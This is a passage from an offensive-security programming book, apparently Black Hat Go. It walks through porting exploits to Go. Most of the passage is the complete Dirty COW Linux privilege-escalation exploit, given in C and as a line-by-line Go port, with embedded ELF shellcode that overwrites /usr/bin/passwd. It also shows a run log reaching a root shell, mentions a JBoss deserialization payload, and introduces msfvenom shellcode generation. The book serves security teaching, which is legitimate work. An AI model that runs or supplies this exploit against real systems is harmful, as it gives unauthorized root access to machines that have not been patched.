<p class="indent">First, you construct your payload by defining your serialized Java object <code>byte</code> slice <span class="ent">❶</span>, hardcoding the portion before your operating system command. Unlike the Python version, which relied on user-defined logic to convert your hexadecimal string to a <code>byte</code> array, the Go version uses the <code>hex.DecodeString()</code> from the <code>encoding/hex</code> package. Next, you determine the length of your operating system command, and then append it and the command itself to your payload <span class="ent">❷</span>. You complete the construction of your payload by decoding your hardcoded hexadecimal trailer string onto your existing payload <span class="ent">❸</span>. The code for this is slightly more verbose than the Python version because we intentionally added in additional error handling, but it’s also able to use Go’s standard <code>encoding</code> package to easily decode your hexadecimal string.</p>&#13;
<p class="indent">You proceed to initialize your HTTP client <span class="ent">❹</span>, configuring it for SSL communications if requested, and then build a POST request. Prior to sending the request, you set your necessary HTTP headers <span class="ent">❺</span> so that the JBoss server interprets the content type appropriately. Notice that you don’t explicitly set the <code>Content-Length</code> HTTP header. That’s because Go’s <code>http</code> package does that for you automatically. Finally, you send your malicious request by calling <code>client.Do(req)</code> <span class="ent">❻</span>.</p>&#13;
<p class="indent">For the most part, this code makes use of what you’ve already learned. The code introduces small modifications such as configuring SSL to ignore invalid certificates <span class="ent">❹</span> and adding specific HTTP headers <span class="ent">❺</span>. Perhaps the one novel element in our code is the use of <code>hex.DecodeString()</code>, which is a Go core function that translates a hexadecimal string to its equivalent byte representation. You’d have to do this manually in Python. <a href="ch09.xhtml#ch19tab2">Table 9-2</a> shows some additional, commonly encountered Python functions or constructs with their Go equivalents.</p>&#13;
<p class="indent">This is not a comprehensive list of functional mappings. Too many variations and edge cases exist to cover all the possible functions required for porting exploits. We’re hopeful that this will help you translate at least some of the most common Python functions to Go.</p>&#13;
<p class="tabcap" id="ch19tab2"><strong>Table 9-2:</strong> <span epub:type="pagebreak" id="page_201"/>Common Python Functions and Their Go Equivalents</p>&#13;
<table class="topbot-d1">&#13;
<colgroup>&#13;
<col style="width:30%"/>&#13;
<col style="width:30%"/>&#13;
<col style="width:40%"/>&#13;
</colgroup>&#13;
<tbody>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-h"><p class="taba"><strong>Python</strong></p></td>&#13;
<td style="vertical-align: top;" class="table-h"><p class="taba"><strong>Go</strong></p></td>&#13;
<td style="vertical-align: top;" class="table-h"><p class="taba"><strong>Notes</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba"><code>hex(<span class="codeitalic">x)</code></span></p></td>&#13;
<td style="vertical-align: top;"><p class="taba"><code>fmt.Sprintf("</code> <span class="codeitalic">%#x</span><code>",</code> <span class="codeitalic">x</span><code>)</code></p></td>&#13;
<td style="vertical-align: top;"><p class="taba">Converts an integer, <span class="codeitalic">x</span>, to a lowercase hexadecimal string, prefixed with <code>"0x</code><span class="codeitalic">".</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><code>ord(</code><span class="codeitalic">c</span><code>)</code></p></td>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><code>rune(</code><span class="codeitalic">c</span><code>)</code></p></td>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba">Used to retrieve the integer (<code>int32</code>) value of a single character. Works for standard 8-bit strings or multibyte Unicode. Note that <code>rune</code> is a built-in type in Go and makes working with ASCII and Unicode data fairly simple.</p></td>&#13;
</tr><tr>&#13;
<td style="vertical-align: top;"><p class="taba"><code>chr(</code><span class="codeitalic">i</span><code>) and unichr(</code><span class="codeitalic">i</span><code>)</code></p></td>&#13;
<td style="vertical-align: top;"><p class="taba"><code>fmt.Sprintf("</code><span class="codeitalic">%+q</span><code>", rune(</code><span class="codeitalic">i</span><code>))</code></p></td>&#13;
<td style="vertical-align: top;"><p class="taba">The inverse of <code>ord</code> in Python, <code>chr</code> and <code>unichr</code> return a string of length 1 for the integer input. In Go, you use the <code>rune</code> type and can retrieve it as a string by using the <code>%+q</code> format sequence.</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><code>struct.pack(</code><span class="codeitalic">fmt</span><code>,</code> <span class="codeitalic">v1</span><code>,</code> <span class="codeitalic">v2</span><code>,</code> <span class="codeitalic">. . .</span><code>)</code></p></td>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba"><code>binary.Write(</code><span class="codeitalic">. . .</span><code>)</code></p></td>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba">Creates a binary representation of the data, formatted appropriately for type and endianness.</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba"><code>struct.unpack(</code><span class="codeitalic">fmt</span><code>,</code> <span class="codeitalic">string</span><code>)</code></p></td>&#13;
<td style="vertical-align: top;"><p class="taba"><code>binary.Read(</code><span class="codeitalic">. . .</span><code>)</code></p></td><td style="vertical-align: top;"><p class="taba">The inverse of <code>struct.pack</code> and <code>binary.Write</code>. Reads structured binary data into a specified format and type.</p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<h4 class="h4" id="ch9lev2sec4">Porting an Exploit from C</h4>&#13;
<p class="noindent">Let’s step away from Python and focus on C. C is arguably a less readable language than Python, yet C shares more similarities with Go than Python does. This makes porting exploits from C easier than you might think. To demonstrate, we’ll be porting a local privilege escalation exploit for Linux. The vulnerability, dubbed <em>Dirty COW</em>, pertains to a race condition within the Linux kernel’s memory subsystem. This flaw affected most, if not all, common Linux and Android distributions at the time of disclosure. The vulnerability has since been patched, so you’ll need to take some specific measures to reproduce the examples that follow. Specifically, you’ll need to configure a Linux system with a vulnerable kernel version. Setting this up is beyond the scope of the chapter; however, for reference, we use a 64-bit Ubuntu 14.04 LTS distribution with kernel version 3.13.1.</p>&#13;
<p class="indent">Several variations of the exploit are publicly available. You can find the one we intend to replicate at <em><a href="https://www.exploit-db.com/exploits/40616/">https://www.exploit-db.com/exploits/40616/</a></em>. <a href="ch09.xhtml#ch9list5">Listing 9-5</a> shows the original exploit code, slightly modified for readability, in its entirety.</p>&#13;
<pre>#include &lt;stdio.h&gt;&#13;
#include &lt;stdlib.h&gt;&#13;
#include &lt;sys/mman.h&gt;&#13;
#include &lt;fcntl.h&gt;&#13;
#include &lt;pthread.h&gt;&#13;
#include &lt;string.h&gt;&#13;
#include &lt;unistd.h&gt;&#13;
<span epub:type="pagebreak" id="page_202"/>void *map;&#13;
int f;&#13;
int stop = 0;&#13;
struct stat st;&#13;
char *name;&#13;
pthread_t pth1,pth2,pth3;&#13;
&#13;
// change if no permissions to read&#13;
char suid_binary[] = "/usr/bin/passwd";&#13;
&#13;
unsigned char sc[] = {&#13;
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,&#13;
  <span class="codeitalic1">--snip--</span>&#13;
  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05&#13;
};&#13;
unsigned int sc_len = 177;&#13;
&#13;
void *madviseThread(void *arg)&#13;
{&#13;
    char *str;&#13;
    str=(char*)arg;&#13;
    int i,c=0;&#13;
    for(i=0;i&lt;1000000 &amp;&amp; !stop;i++) {&#13;
        c+=madvise(map,100,MADV_DONTNEED);&#13;
    }&#13;
    printf("thread stopped\n");&#13;
}&#13;
&#13;
void *procselfmemThread(void *arg)&#13;
{&#13;
    char *str;&#13;
    str=(char*)arg;&#13;
    int f=open("/proc/self/mem",O_RDWR);&#13;
    int i,c=0;&#13;
    for(i=0;i&lt;1000000 &amp;&amp; !stop;i++) {&#13;
        lseek(f,map,SEEK_SET);&#13;
        c+=write(f, str, sc_len);&#13;
    }&#13;
    printf("thread stopped\n");&#13;
}&#13;
&#13;
void *waitForWrite(void *arg) {&#13;
    char buf[sc_len];&#13;
&#13;
    for(;;) {&#13;
        FILE *fp = fopen(suid_binary, "rb");&#13;
&#13;
        fread(buf, sc_len, 1, fp);&#13;
&#13;
        if(memcmp(buf, sc, sc_len) == 0) {&#13;
            printf("%s is overwritten\n", suid_binary);&#13;
            break;&#13;
        }&#13;
<span epub:type="pagebreak" id="page_203"/>        fclose(fp);&#13;
        sleep(1);&#13;
    }&#13;
&#13;
    stop = 1;&#13;
&#13;
    printf("Popping root shell.\n");&#13;
    printf("Don't forget to restore /tmp/bak\n");&#13;
&#13;
    system(suid_binary);&#13;
}&#13;
&#13;
int main(int argc,char *argv[]) {&#13;
    char *backup;&#13;
&#13;
    printf("DirtyCow root privilege escalation\n");&#13;
    printf("Backing up %s.. to /tmp/bak\n", suid_binary);&#13;
&#13;
    asprintf(&amp;backup, "cp %s /tmp/bak", suid_binary);&#13;
    system(backup);&#13;
&#13;
    f = open(suid_binary,O_RDONLY);&#13;
    fstat(f,&amp;st);&#13;
&#13;
    printf("Size of binary: %d\n", st.st_size);&#13;
&#13;
    char payload[st.st_size];&#13;
    memset(payload, 0x90, st.st_size);&#13;
    memcpy(payload, sc, sc_len+1);&#13;
&#13;
    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);&#13;
&#13;
    printf("Racing, this may take a while..\n");&#13;
&#13;
    pthread_create(&amp;pth1, NULL, &amp;madviseThread, suid_binary);&#13;
    pthread_create(&amp;pth2, NULL, &amp;procselfmemThread, payload);&#13;
    pthread_create(&amp;pth3, NULL, &amp;waitForWrite, NULL);&#13;
&#13;
    pthread_join(pth3, NULL);&#13;
&#13;
    return 0;&#13;
}</pre>&#13;
<p class="caption" id="ch9list5"><em>Listing 9-5: The Dirty COW privilege escalation exploit written in the C language</em></p>&#13;
<p class="indent">Rather than explaining the details of the C code’s logic, let’s look at it generally, and then break it into chunks to compare it line by line with the Go version.</p>&#13;
<p class="indent">The exploit defines some malicious shellcode, in Executable and Linkable Format (ELF), that generates a Linux shell. It executes the code as a privileged user by creating multiple threads that call various system functions to write our shellcode to memory locations. Eventually, the shellcode exploits the vulnerability by overwriting the contents of a binary executable file that happens to have the SUID bit set and belongs to the root user. In this case, <span epub:type="pagebreak" id="page_204"/>that binary is <em>/usr/bin/passwd</em>. Normally, a nonroot user wouldn’t be able to overwrite the file. However, because of the Dirty COW vulnerability, you achieve privilege escalation because you can write arbitrary contents to the file while preserving the file permissions.</p>&#13;
<p class="indent">Now let’s break the C code into easily digestible portions and compare each section with its equivalent in Go. Note that the Go version is specifically trying to achieve a line-by-line reproduction of the C version. <a href="ch09.xhtml#ch9list6">Listing 9-6</a> shows the global variables defined or initialized outside our functions in C, while <a href="ch09.xhtml#ch9list7">Listing 9-7</a> shows them in Go.</p>&#13;
<pre><span class="ent">❶</span> void *map;&#13;
   int f;&#13;
<span class="ent">❷</span> int stop = 0;&#13;
   struct stat st;&#13;
   char *name;&#13;
   pthread_t pth1,pth2,pth3;&#13;
&#13;
   // change if no permissions to read&#13;
<span class="ent">❸</span> char suid_binary[] = "/usr/bin/passwd";&#13;
&#13;
<span class="ent">❹</span> unsigned char sc[] = {&#13;
     0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,&#13;
     <span class="codeitalic1">--snip--</span>&#13;
     0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05&#13;
   };&#13;
   unsigned int sc_len = 177;</pre>&#13;
<p class="caption" id="ch9list6"><em>Listing 9-6: Initialization in C</em></p>&#13;
<pre><span class="ent">❶</span> var mapp uintptr&#13;
<span class="ent">❷</span> var signals = make(chan bool, 2)&#13;
<span class="ent">❸</span> const SuidBinary = "/usr/bin/passwd"&#13;
&#13;
<span class="ent">❹</span> var sc = []byte{&#13;
       0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,&#13;
       <span class="codeitalic1">--snip--</span>&#13;
       0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,&#13;
   }</pre>&#13;
<p class="caption" id="ch9list7"><em>Listing 9-7: Initialization in Go</em></p>&#13;
<p class="indent">The translation between C and Go is fairly straightforward. The two code sections, C and Go, maintain the same numbering to demonstrate how Go achieves similar functionality to the respective lines of C code. In both cases, you track mapped memory by defining a <code>uintptr</code> variable <span class="ent">❶</span>. In Go, you declare the variable name as <code>mapp</code> since, unlike C, <code>map</code> is a reserved keyword in Go. You then initialize a variable to be used for signaling the threads to stop processing <span class="ent">❷</span>. Rather than use an integer, as the C code does, the Go convention is instead to use a buffered boolean channel. You explicitly define its length to be <code>2</code> since there will be two concurrent functions that you’ll wish to signal. Next, you define a string to your SUID executable <span class="ent">❸</span> <span epub:type="pagebreak" id="page_205"/>and wrap up your global variables by hardcoding your shellcode into a slice <span class="ent">❹</span>. A handful of global variables were omitted in the Go code compared to the C version, which means you’ll define them as needed within their respective code blocks.</p>&#13;
<p class="indent">Next, let’s look at <code>madvise()</code> and <code>procselfmem()</code>, the two primary functions that exploit the race condition. Again, we’ll compare the C version in <a href="ch09.xhtml#ch9list8">Listing 9-8</a> with the Go version in <a href="ch09.xhtml#ch9list9">Listing 9-9</a>.</p>&#13;
<pre>void *madviseThread(void *arg)&#13;
{&#13;
    char *str;&#13;
    str=(char*)arg;&#13;
    int i,c=0;&#13;
    for(i=0;i&lt;1000000 &amp;&amp; !stop;i++<span class="ent">❶</span>) {&#13;
        c+=madvise(map,100,MADV_DONTNEED)<span class="ent">❷</span>;&#13;
    }&#13;
    printf("thread stopped\n");&#13;
}&#13;
&#13;
void *procselfmemThread(void *arg)&#13;
{&#13;
    char *str;&#13;
    str=(char*)arg;&#13;
    int f=open("/proc/self/mem",O_RDWR);&#13;
    int i,c=0;&#13;
    for(i=0;i&lt;1000000 &amp;&amp; !stop;i++<span class="ent">❶</span>) {&#13;
     <span class="ent">❸</span> lseek(f,map,SEEK_SET);&#13;
        c+=write(f, str, sc_len)<span class="ent">❹</span>;&#13;
    }&#13;
    printf("thread stopped\n");&#13;
}</pre>&#13;
<p class="caption" id="ch9list8"><em>Listing 9-8: Race condition functions in C</em></p>&#13;
<pre>func madvise() {&#13;
    for i := 0; i &lt; 1000000; i++ {&#13;
        select {&#13;
        case &lt;- signals: <span class="ent">❶</span>&#13;
            fmt.Println("madvise done")&#13;
            return&#13;
        default:&#13;
            syscall.Syscall(syscall.SYS_MADVISE, mapp, uintptr(100), syscall.MADV_DONTNEED) <span class="ent">❷</span>&#13;
        }&#13;
    }&#13;
}&#13;
&#13;
func procselfmem(payload []byte) {&#13;
    f, err := os.OpenFile("/proc/self/mem", syscall.O_RDWR, 0)&#13;
    if err != nil {&#13;
        log.Fatal(err)&#13;
    }&#13;
<span epub:type="pagebreak" id="page_206"/>    for i := 0; i &lt; 1000000; i++ {&#13;
        select {&#13;
        case &lt;- signals: <span class="ent">❶</span>&#13;
            fmt.Println("procselfmem done")&#13;
            return&#13;
        default:&#13;
            syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET)) <span class="ent">❸</span>&#13;
            f.Write(payload) <span class="ent">❹</span>&#13;
        }&#13;
    }&#13;
}</pre>&#13;
<p class="caption" id="ch9list9"><em>Listing 9-9: Race condition functions in Go</em></p>&#13;
<p class="indent">The race condition functions use variations for signaling <span class="ent">❶</span>. Both functions contain <code>for</code> loops that iterate an extensive number of times. The C version checks the value of the <code>stop</code> variable, while the Go version uses a <code>select</code> statement that attempts to read from the <code>signals</code> channel. When a signal is present, the function returns. In the event that no signal is waiting, the <code>default</code> case executes. The primary differences between the <code>madvise()</code> and <code>procselfmem()</code> functions occur within the <code>default</code> case. Within our <code>madvise()</code><span class="literal"/> function, you issue a Linux system call to the <code>madvise()</code> <span class="ent">❷</span> function, whereas your <code>procselfmem()</code> function issues Linux system calls to <code>lseek()</code> <span class="ent">❸</span> and writes your payload to memory <span class="ent">❹</span>.</p>&#13;
<p class="indent">Here are the main differences between the C and Go versions of these functions:</p>&#13;
<ul>&#13;
<li><p class="noindent">The Go version uses a channel to determine when to prematurely break the loop, while the C function uses an integer value to signal when to break the loop after the thread race condition has occurred.</p></li>&#13;
<li><p class="noindent">The Go version uses the <code>syscall</code> package to issue Linux system calls. The parameters passed to the function include the system function to be called and its required parameters. You can find the name, purpose, and parameters of the function by searching Linux documentation. This is how we are able to call native Linux functions.</p></li>&#13;
</ul>&#13;
<p class="indent">Now, let’s review the <code>waitForWrite()</code> function, which monitors for the presence of changes to SUID in order to execute the shellcode. The C version is shown in <a href="ch09.xhtml#ch9list10">Listing 9-10</a>, and the Go version is shown in <a href="ch09.xhtml#ch9list11">Listing 9-11</a>.</p>&#13;
<pre>void *waitForWrite(void *arg) {&#13;
    char buf[sc_len];&#13;
&#13;
 <span class="ent">❶</span> for(;;) {&#13;
        FILE *fp = fopen(suid_binary, "rb");&#13;
&#13;
        fread(buf, sc_len, 1, fp);&#13;
&#13;
        if(memcmp(buf, sc, sc_len) == 0) {&#13;
            printf("%s is overwritten\n", suid_binary);&#13;
            break;&#13;
        }&#13;
<span epub:type="pagebreak" id="page_207"/>        fclose(fp);&#13;
        sleep(1);&#13;
    }&#13;
&#13;
 <span class="ent">❷</span> stop = 1;&#13;
&#13;
    printf("Popping root shell.\n");&#13;
    printf("Don't forget to restore /tmp/bak\n");&#13;
&#13;
 <span class="ent">❸</span> system(suid_binary);&#13;
}</pre>&#13;
<p class="caption" id="ch9list10"><em>Listing 9-10: The</em> <span class="codeitalic">waitForWrite()</span> <em>function in C</em></p>&#13;
<pre>func waitForWrite() {&#13;
    buf := make([]byte, len(sc))&#13;
 <span class="ent">❶</span> for {&#13;
        f, err := os.Open(SuidBinary)&#13;
        if err != nil {&#13;
            log.Fatal(err)&#13;
        }&#13;
        if _, err := f.Read(buf); err != nil {&#13;
            log.Fatal(err)&#13;
        }&#13;
        f.Close()&#13;
        if bytes.Compare(buf, sc) == 0 {&#13;
            fmt.Printf("%s is overwritten\n", SuidBinary)&#13;
            break&#13;
        }&#13;
        time.Sleep(1*time.Second)&#13;
    }&#13;
 <span class="ent">❷</span> signals &lt;- true&#13;
    signals &lt;- true&#13;
&#13;
&#13;
    fmt.Println("Popping root shell")&#13;
    fmt.Println("Don't forget to restore /tmp/bak\n")&#13;
&#13;
    attr := os.ProcAttr {&#13;
        Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},&#13;
    }&#13;
    proc, err := os.StartProcess(SuidBinary, nil, &amp;attr) <span class="ent">❸</span>&#13;
    if err !=nil {&#13;
        log.Fatal(err)&#13;
    }&#13;
    proc.Wait()&#13;
    os.Exit(0)&#13;
}</pre>&#13;
<p class="caption" id="ch9list11"><em>Listing 9-11: The</em> <span class="codeitalic">waitForWrite()</span> <em>function in Go</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_208"/>In both cases, the code defines an infinite loop that monitors the SUID binary file for changes <span class="ent">❶</span>. While the C version uses <code>memcmp()</code> to check whether the shellcode has been written to the target, the Go code uses <code>bytes.Compare()</code>. When the shellcode is present, you’ll know the exploit succeeded in overwriting the file. You then break out of the infinite loop and signal the running threads that they can now stop <span class="ent">❷</span>. As with the code for the race conditions, the Go version does this via a channel, while the C version uses an integer. Lastly, you execute what is probably the best part of the function: the SUID target file that now has your malicious code within it <span class="ent">❸</span>. The Go version is a little bit more verbose, as you need to pass in attributes corresponding to stdin, stdout, and stderr: files pointers to open input files, output files, and error file descriptors, respectively.</p>&#13;
<p class="indent">Now let’s look at our <code>main()</code> function, which calls the previous functions necessary to execute this exploit. <a href="ch09.xhtml#ch9list12">Listing 9-12</a> shows the C version, and <a href="ch09.xhtml#ch9list13">Listing 9-13</a> shows the Go version.</p>&#13;
<pre>int main(int argc,char *argv[]) {&#13;
    char *backup;&#13;
&#13;
    printf("DirtyCow root privilege escalation\n");&#13;
    printf("Backing up %s.. to /tmp/bak\n", suid_binary);&#13;
&#13;
 <span class="ent">❶</span> asprintf(&amp;backup, "cp %s /tmp/bak", suid_binary);&#13;
    system(backup);&#13;
&#13;
&#13;
 <span class="ent">❷</span> f = open(suid_binary,O_RDONLY);&#13;
    fstat(f,&amp;st);&#13;
&#13;
    printf("Size of binary: %d\n", st.st_size);&#13;
&#13;
 <span class="ent">❸</span> char payload[st.st_size];&#13;
    memset(payload, 0x90, st.st_size);&#13;
    memcpy(payload, sc, sc_len+1);&#13;
&#13;
 <span class="ent">❹</span> map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);&#13;
&#13;
&#13;
    printf("Racing, this may take a while..\n");&#13;
&#13;
 <span class="ent">❺</span> pthread_create(&amp;pth1, NULL, &amp;madviseThread, suid_binary);&#13;
    pthread_create(&amp;pth2, NULL, &amp;procselfmemThread, payload);&#13;
    pthread_create(&amp;pth3, NULL, &amp;waitForWrite, NULL);&#13;
&#13;
    pthread_join(pth3, NULL);&#13;
&#13;
    return 0;&#13;
}</pre>&#13;
<p class="caption" id="ch9list12"><em>Listing 9-12: The</em> <span class="codeitalic">main()</span> <em>function in C</em></p>&#13;
<pre><span epub:type="pagebreak" id="page_209"/>func main() {&#13;
    fmt.Println("DirtyCow root privilege escalation")&#13;
    fmt.Printf("Backing up %s.. to /tmp/bak\n", SuidBinary)&#13;
&#13;
  <span class="ent">❶</span> backup := exec.Command("cp", SuidBinary, "/tmp/bak")&#13;
     if err := backup.Run(); err != nil {&#13;
         log.Fatal(err)&#13;
     }&#13;
&#13;
  <span class="ent">❷</span> f, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600)&#13;
     if err != nil {&#13;
         log.Fatal(err)&#13;
     }&#13;
     st, err := f.Stat()&#13;
     if err != nil {&#13;
         log.Fatal(err)&#13;
     }&#13;
&#13;
     fmt.Printf("Size of binary: %d\n", st.Size())&#13;
&#13;
  <span class="ent">❸</span> payload := make([]byte, st.Size())&#13;
     for i, _ := range payload {&#13;
         payload[i] = 0x90&#13;
     }&#13;
     for i, v := range sc {&#13;
         payload[i] = v&#13;
     }&#13;
&#13;
  <span class="ent">❹</span> mapp, _, _ = syscall.Syscall6(&#13;
        syscall.SYS_MMAP,&#13;
        uintptr(0),&#13;
        uintptr(st.Size()),&#13;
        uintptr(syscall.PROT_READ),&#13;
        uintptr(syscall.MAP_PRIVATE),&#13;
        f.Fd(),&#13;
        0,&#13;
     )&#13;
&#13;
     fmt.Println("Racing, this may take a while..\n")&#13;
  <span class="ent">❺</span> go madvise()&#13;
     go procselfmem(payload)&#13;
     waitForWrite()&#13;
}</pre>&#13;
<p class="caption" id="ch9list13"><em>Listing 9-13: The</em> <span class="codeitalic">main()</span> <em>function in Go</em></p>&#13;
<p class="indent">The <code>main()</code> function starts by backing up the target executable <span class="ent">❶</span>. Since you’ll eventually be overwriting it, you don’t want to lose the original version; doing so may adversely affect the system. While C allows you to run an operating system command by calling <code>system()</code> and passing it the entire command as a single string, the Go version relies on the <code>exec.Command()</code> function, which requires you to pass the command as separate arguments. Next, you open the SUID target file in read-only mode <span class="ent">❷</span>, retrieving the file stats, <span epub:type="pagebreak" id="page_210"/>and then use them to initialize a payload slice of identical size as the target file <span class="ent">❸</span>. In C, you fill the array with NOP (0x90) instructions by calling <code>memset()</code>, and then copy over a portion of the array with your shellcode by calling <code>memcpy()</code>. These are convenience functions that don’t exist in Go.</p>&#13;
<p class="indent">Instead, in Go, you loop over the slice elements and manually populate them one byte at a time. After doing so, you issue a Linux system call to the <code>mapp()</code> function <span class="ent">❹</span>, which maps the contents of your target SUID file to memory. As for previous system calls, you can find the parameters needed for <code>mapp()</code> by searching the Linux documentation. You may notice that the Go code issues a call to <code>syscall.Syscall6()</code> rather than <code>syscall.Syscall()</code>. The <code>Syscall6()</code> function is used for system calls that expect six input parameters, as is the case with <code>mapp()</code>. Lastly, the code spins up a couple of threads, calling the <code>madvise()</code> and <code>procselfmem()</code> functions concurrently <span class="ent">❺</span>. As the race condition ensues, you call your <code>waitForWrite()</code> function, which monitors for changes to your SUID file, signals the threads to stop, and executes your malicious code.</p>&#13;
<p class="indent">For completeness, <a href="ch09.xhtml#ch9list14">Listing 9-14</a> shows the entirety of the ported Go code.</p>&#13;
<pre>var mapp uintptr&#13;
var signals = make(chan bool, 2)&#13;
const SuidBinary = "/usr/bin/passwd"&#13;
&#13;
&#13;
var sc = []byte{&#13;
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,&#13;
    <span class="codeitalic1">--snip--</span>&#13;
    0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,&#13;
}&#13;
&#13;
func madvise() {&#13;
    for i := 0; i &lt; 1000000; i++ {&#13;
        select {&#13;
        case &lt;- signals:&#13;
            fmt.Println("madvise done")&#13;
            return&#13;
        default:&#13;
            syscall.Syscall(syscall.SYS_MADVISE, mapp, uintptr(100), syscall.MADV_DONTNEED)&#13;
        }&#13;
    }&#13;
}&#13;
&#13;
func procselfmem(payload []byte) {&#13;
    f, err := os.OpenFile("/proc/self/mem", syscall.O_RDWR, 0)&#13;
    if err != nil {&#13;
        log.Fatal(err)&#13;
    }&#13;
    for i := 0; i &lt; 1000000; i++ {&#13;
        select {&#13;
        case &lt;- signals:&#13;
            fmt.Println("procselfmem done")&#13;
            return&#13;
        default:&#13;
            syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET))&#13;
<span epub:type="pagebreak" id="page_211"/>            f.Write(payload)&#13;
        }&#13;
    }&#13;
}&#13;
&#13;
func waitForWrite() {&#13;
    buf := make([]byte, len(sc))&#13;
    for {&#13;
        f, err := os.Open(SuidBinary)&#13;
        if err != nil {&#13;
            log.Fatal(err)&#13;
        }&#13;
        if _, err := f.Read(buf); err != nil {&#13;
            log.Fatal(err)&#13;
        }&#13;
        f.Close()&#13;
        if bytes.Compare(buf, sc) == 0 {&#13;
            fmt.Printf("%s is overwritten\n", SuidBinary)&#13;
            break&#13;
        }&#13;
        time.Sleep(1*time.Second)&#13;
    }&#13;
    signals &lt;- true&#13;
    signals &lt;- true&#13;
&#13;
&#13;
    fmt.Println("Popping root shell")&#13;
    fmt.Println("Don't forget to restore /tmp/bak\n")&#13;
&#13;
    attr := os.ProcAttr {&#13;
        Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},&#13;
    }&#13;
    proc, err := os.StartProcess(SuidBinary, nil, &amp;attr)&#13;
    if err !=nil {&#13;
        log.Fatal(err)&#13;
    }&#13;
    proc.Wait()&#13;
    os.Exit(0)&#13;
}&#13;
&#13;
func main() {&#13;
    fmt.Println("DirtyCow root privilege escalation")&#13;
    fmt.Printf("Backing up %s.. to /tmp/bak\n", SuidBinary)&#13;
&#13;
    backup := exec.Command("cp", SuidBinary, "/tmp/bak")&#13;
    if err := backup.Run(); err != nil {&#13;
        log.Fatal(err)&#13;
    }&#13;
&#13;
    f, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600)&#13;
    if err != nil {&#13;
        log.Fatal(err)&#13;
    }&#13;
    st, err := f.Stat()&#13;
    if err != nil {&#13;
<span epub:type="pagebreak" id="page_212"/>        log.Fatal(err)&#13;
    }&#13;
&#13;
    fmt.Printf("Size of binary: %d\n", st.Size())&#13;
&#13;
    payload := make([]byte, st.Size())&#13;
    for i, _ := range payload {&#13;
        payload[i] = 0x90&#13;
    }&#13;
    for i, v := range sc {&#13;
        payload[i] = v&#13;
    }&#13;
&#13;
    mapp, _, _ = syscall.Syscall6(&#13;
        syscall.SYS_MMAP,&#13;
        uintptr(0),&#13;
        uintptr(st.Size()),&#13;
        uintptr(syscall.PROT_READ),&#13;
        uintptr(syscall.MAP_PRIVATE),&#13;
        f.Fd(),&#13;
        0,&#13;
    )&#13;
&#13;
    fmt.Println("Racing, this may take a while..\n")&#13;
    go madvise()&#13;
    go procselfmem(payload)&#13;
    waitForWrite()&#13;
}</pre>&#13;
<p class="caption" id="ch9list14"><em>Listing 9-14: The complete Go port</em> (/<a href="https://github.com/blackhat-go/bhg/blob/master/ch-9/dirtycow/main.go/">ch-9/dirtycow/main.go/</a>)</p>&#13;
<p class="indent">To confirm that your code works, run it on your vulnerable host. There’s nothing more satisfying than seeing a root shell.</p>&#13;
<pre>alice@ubuntu:~$ <span class="codestrong1">go run main.go</span>&#13;
DirtyCow root privilege escalation&#13;
Backing up /usr/bin/passwd.. to /tmp/bak&#13;
Size of binary: 47032&#13;
Racing, this may take a while..&#13;
&#13;
&#13;
/usr/bin/passwd is overwritten&#13;
Popping root shell&#13;
procselfmem done&#13;
Don't forget to restore /tmp/bak&#13;
&#13;
&#13;
root@ubuntu:/home/alice# id&#13;
uid=0(root) gid=1000(alice) groups=0(root),4(adm),1000(alice)</pre>&#13;
<p class="indent">As you can see, a successful run of the program backs up the <em>/usr/bin/passwd</em> file, races for control of the handle, overwrites the file location with the newly intended values, and finally produces a system shell. The output of the Linux <code>id</code> command confirms that the <code>alice</code> user account has been elevated to a <code>uid=0</code> value, indicating root-level privilege.</p>&#13;
<h3 class="h3" id="ch9lev1sec3"><span epub:type="pagebreak" id="page_213"/>Creating Shellcode in Go</h3>&#13;
<p class="noindent">In the previous section, you used raw shellcode in valid ELF format to overwrite a legitimate file with your malicious alternative. How might you generate that shellcode yourself? As it turns out, you can use your typical toolset to generate Go-friendly shellcode.</p>&#13;
<p class="indent">We’ll show you how to do this with <code>msfvenom</code>, a command-line utility, but the integration techniques we’ll teach you aren’t tool-specific. You can use several methods to work with external binary data, be it shellcode or something else, and integrate it into your Go code. Rest assured that the following pages deal more with common data representations than anything specific to a tool.</p>&#13;
